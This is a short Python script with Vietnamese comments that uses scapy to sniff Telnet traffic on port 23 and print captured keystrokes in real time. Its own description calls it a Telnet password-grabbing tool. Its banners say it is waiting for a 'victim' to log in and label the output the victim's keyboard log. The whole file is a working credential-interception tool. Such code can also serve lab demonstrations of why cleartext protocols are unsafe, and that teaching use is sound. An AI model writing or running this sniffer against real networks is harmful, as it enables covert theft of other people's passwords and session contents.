import argparse
from scapy.all import sniff, Raw

def on_packet(packet):
    # Lục lọi xem gói tin có chứa lớp Raw (Chứa dữ liệu thực tế) hay không
    if packet.haslayer(Raw):
        raw_payload = packet[Raw].load
        
        try:
            # Giải mã các byte dữ liệu thành chữ cái (bỏ qua các byte điều khiển hệ thống)
            text = raw_payload.decode("utf-8", errors="ignore")
            
            # Kỹ thuật in Real-time: Telnet thường gửi từng ký tự một mỗi khi user gõ phím.
            # Ta sẽ in nối tiếp nó trên màn hình để sếp thấy chữ hiện ra y như có ma đang gõ!
            for char in text:
                if char.isprintable():
                    print(char, end="", flush=True)
                elif char in ["\r", "\n"]:
                    print() # Phát hiện phím Enter thì cho xuống dòng
        except Exception:
            pass

def main() -> None:
    parser = argparse.ArgumentParser(description="Tool bat mat khau Telnet (Clear Text)")
    parser.add_argument("--iface", required=True, help="Ten interface mang (vd: Ethernet)")
    args = parser.parse_args()

    print("="*50)
    print(f"[*] Đang rình rập luồng Telnet trên cổng: {args.iface}")
    print("[*] Chờ nạn nhân đăng nhập...")
    print("="*50)
    print("\n[NHẬT KÝ BÀN PHÍM NẠN NHÂN]:")

    # Bóp cò: Chỉ tóm cổ những gói tin đi qua cổng 23 (Telnet)
    sniff(iface=args.iface, filter="tcp port 23", prn=on_packet, store=False)

if __name__ == "__main__":
    main()